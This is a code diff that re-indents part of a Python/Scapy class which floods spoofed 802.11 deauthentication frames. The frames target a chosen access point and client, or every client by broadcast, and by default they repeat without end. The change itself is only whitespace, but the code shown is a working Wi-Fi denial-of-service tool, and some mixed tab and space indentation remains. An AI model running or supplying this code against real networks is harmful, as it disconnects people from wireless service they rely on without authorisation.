@@ -45,17 +45,17 @@ class Deauth:
 
     def __deauth(self, bssid, client = "FF:FF:FF:FF:FF:FF", count = -1):
         pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth()
-	    client_2_ap_pkt = None
-	    if client != 'FF:FF:FF:FF:FF:FF':
+        client_2_ap_pkt = None
+        if client != 'FF:FF:FF:FF:FF:FF':
             client_2_ap_pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Deauth()
-	    print 'Sending Deauth to ' + client + ' from ' + bssid
+        print 'Sending Deauth to ' + client + ' from ' + bssid
         print '> '
-	    while count != 0:
-		    for i in range(64):
+        while count != 0:
+            for i in range(64):
 				sendp(pkt, iface = self.iface)
 				if client != 'FF:FF:FF:FF:FF:FF':
                     sendp(client_2_ap_pkt, iface = self.iface)
-		    count -= 1
+                count -= 1
 
     def deauth(self, bssid, client = "FF:FF:FF:FF:FF:FF", count = -1):
         proc = Process(target = self.__deauth, args = (bssid,client,count,))
